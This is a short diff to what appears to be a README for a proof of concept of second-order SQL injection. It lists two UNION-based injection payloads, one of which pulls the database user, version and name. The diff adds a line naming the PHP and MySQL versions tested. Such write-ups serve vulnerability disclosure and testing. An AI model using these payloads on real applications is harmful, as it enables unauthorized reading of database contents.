@@ -11,3 +11,4 @@ This is a POC for Second Order SQL Injection
   1. Payload: X' UNION SELECT user(),version(),database(), 4 -- 
   2. Palyoad:  X' UNION SELECT 1,2,3,4 -- 
   
+Note: Tested on Ubuntu X86_64 - PHP 7.0.22-2 version, Mysql 5.7.17-0ubuntu0.16.04.1
